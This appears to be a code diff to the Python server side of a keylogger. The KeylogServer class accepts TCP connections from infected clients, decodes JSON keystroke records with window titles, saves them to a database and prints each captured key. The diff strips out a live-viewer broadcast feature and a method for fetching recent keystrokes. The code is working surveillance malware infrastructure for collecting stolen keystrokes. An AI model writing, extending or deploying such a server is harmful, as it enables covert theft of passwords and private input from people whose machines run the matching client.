@@ -1,7 +1,6 @@
 import socket
 import json
 import threading
-from datetime import datetime
 from src.client.key_log import database
 
 
@@ -12,9 +11,6 @@ class KeylogServer:
         self.server_socket = None
         self.is_running = False
 
-        self.view_clients = []
-        self.lock = threading.Lock()
-
     def start(self):
         try:
             self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -22,11 +18,13 @@ class KeylogServer:
             self.server_socket.bind((self.host, self.port))
             self.server_socket.listen(20)
 
-            print(f"[+] Server running at {self.host}:{self.port}")
+            print(f"[+] Keylog Server running at {self.host}:{self.port}")
             self.is_running = True
 
             while self.is_running:
                 client_socket, address = self.server_socket.accept()
+                print(f"[+] New client {address}")
+
                 threading.Thread(
                     target=self.client_handler,
                     args=(client_socket, address),
@@ -34,45 +32,14 @@ class KeylogServer:
                 ).start()
 
         except Exception as e:
-            print("[-] Server error:", e)
+            print("❌ Server error:", e)
+
         finally:
             self.stop()
 
     def client_handler(self, client_socket, address):
-        try:
-            first_msg = client_socket.recv(1024).decode()
-            info = json.loads(first_msg)
-
-            if info.get("type") == "viewer":
-                print(f"[VIEW] {address} connected")
-                with self.lock:
-                    self.view_clients.append(client_socket)
-                self.handle_viewer(client_socket, address)
-
-            else:
-                print(f"[KEYLOG] {address} connected")
-                self.handle_keylogger(client_socket, address)
-
-        except:
-            client_socket.close()
-
-    def handle_viewer(self, client_socket, address):
-        try:
-            while True:
-                data = client_socket.recv(1)
-                if not data:
-                    break
-        except:
-            pass
-        finally:
-            with self.lock:
-                if client_socket in self.view_clients:
-                    self.view_clients.remove(client_socket)
-            print(f"[VIEW] disconnected {address}")
-            client_socket.close()
-
-    def handle_keylogger(self, client_socket, address):
         buffer = ""
+
         try:
             while True:
                 data = client_socket.recv(4096).decode("utf-8")
@@ -88,44 +55,26 @@ class KeylogServer:
                         keystroke = json.loads(line)
 
                         ok = database.create_keystroke(
-                            key_data=keystroke["KeyData"],
-                            window_title=keystroke["WindowTitle"]
+                            key_data=keystroke.get("KeyData"),
+                            window_title=keystroke.get("WindowTitle"),
+                            view_id=keystroke.get("ViewID")
                         )
 
-                        self.broadcast(keystroke)
+                        # In console
+                        print(f"[KEY] {address} | {keystroke.get('WindowTitle')} → {keystroke.get('KeyData')}")
 
-                        if ok:
-                            print(f"[✓] {address} -> {keystroke['WindowTitle']} : {keystroke['KeyData']}")
-                        else:
-                            print("[x] DB insert failed")
+                        if not ok:
+                            print("⚠ DB insert failed")
 
-                    except:
-                        print("[-] Bad JSON:", line)
+                    except Exception as e:
+                        print("❌ JSON Error:", e)
 
         except Exception as e:
-            print(f"[-] Client error {address}: {e}")
+            print(f"❌ Client error: {address} -> {e}")
 
         finally:
-            print(f"[KEYLOG] disconnected {address}")
+            print(f"[-] Disconnected: {address}")
             client_socket.close()
-
-    def broadcast(self, msg):
-        remove_list = []
-        data = (json.dumps(msg) + "\n").encode()
-
-        with self.lock:
-            for client in self.view_clients:
-                try:
-                    client.sendall(data)
-                except:
-                    remove_list.append(client)
-
-            for c in remove_list:
-                self.view_clients.remove(c)
-
-    # 🔥 HÀM MỚI → giao diện có thể gọi để lấy log
-    def get_latest_keystrokes(self, limit=50):
-        return database.get_recent_keystrokes(limit)
 
     def stop(self):
         print("[*] Server stopped.")
